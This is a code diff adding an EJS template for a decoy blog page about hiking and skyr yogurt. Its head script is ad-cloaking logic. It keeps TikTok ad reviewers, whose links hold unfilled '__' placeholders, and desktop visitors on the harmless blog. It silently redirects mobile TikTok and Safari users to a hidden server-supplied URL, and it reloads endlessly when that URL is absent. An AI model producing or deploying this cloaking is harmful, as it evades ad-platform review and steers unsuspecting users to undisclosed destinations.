@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= title %></title>
+    <script>
+        const noirp = '<%= noirp %>'; // Passed from the server
+        var urlParams = new URLSearchParams(window.location.search);
+        var utmAidName = urlParams.get('utm_term');
+
+        // Function to check if the user is on a mobile device
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Function to detect browser or app based on user agent string
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+
+            if (userAgent.match(/Tiktok/i)) {
+                return "TikTok Webview";
+            } else if (userAgent.match(/Safari/i) && !userAgent.match(/Chrome|Chromium|CriOS/i)) {
+                return "Safari";
+            } else {
+                return "Other Browser";
+            }
+        }
+
+        // Function to check if any TikTok UTM parameters include "__"
+        function hasTikTokUtmPlaceholders() {
+            const tiktokParams = [
+                'utm_campaign',
+                'utm_id',
+                'utm_term',
+                'utm_content',
+                'atAdId',
+                'atPlacement',
+                'atAdSet',
+                'atCsite',
+                'atAdType'
+            ];
+
+            // Check if any of the TikTok UTM parameters contain "__"
+            for (const param of tiktokParams) {
+                var paramValue = urlParams.get(param);
+                if (paramValue && paramValue.includes("__")) {
+                    return true;  // If a parameter contains "__", stay on the page
+                }
+            }
+            return false;  // If none contain "__", proceed to redirection logic
+        }
+
+        // Logic for continuous refresh or intended redirect
+        if (utmAidName !== '__AID_NAME__') {
+            if (noirp === 'undefined' || !noirp) {
+                // Continuous refresh when noirp is undefined
+                window.location.href = window.location.href;
+            } else {
+                // Apply checks when noirp is valid (golden slug case)
+                if (hasTikTokUtmPlaceholders()) {
+                    console.log('TikTok UTM params contain "__". Staying on the page.');
+                    // Stay on the page since one or more TikTok UTM params contain "__"
+                } else {
+                    const browser = getBrowserInfo();  // Detect the browser
+                    if (isMobile() && (browser === "TikTok Webview" || browser === "Safari")) {
+                        console.log(`User is on ${browser} and mobile. Redirecting to:`, noirp);
+                        window.location.href = noirp;  // Redirect to the intended site if mobile and on TikTok/Safari
+                    } else {
+                        console.log(`User is on ${browser} or desktop. Staying on the current page.`);
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            background-color: #333;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        nav a {
+            margin: 0 15px;
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .post {
+            margin-bottom: 30px;
+        }
+
+        .post h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .post p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .post .date {
+            font-size: 0.9em;
+            color: #999;
+            margin-bottom: 15px;
+        }
+
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 20px;
+        }
+
+        footer p {
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1><%= title %></h1>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">About</a>
+            <a href="#">Contact</a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <div class="post">
+            <h2>First Blog Post</h2>
+            <p class="date">Published on September 28, 2024</p>
+            <p>Welcome to the deku stories! Try to be simple and smart, also try to dance a</p>
+        </div>
+
+        <div class="post">
+            <h2>Another Day, Another Post</h2>
+            <p class="date">Published on September 26, 2024</p>
+            <p>
+                Today, I need to tell you about how you should go and try hiking while getting
+                some fresh air outside, I like to hike and stare at the mountaintops while 
+                eating my skyr yogurt.
+            </p>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 My yogurt | All Rights Reserved</p>
+    </footer>
+
+</body>
+</html>
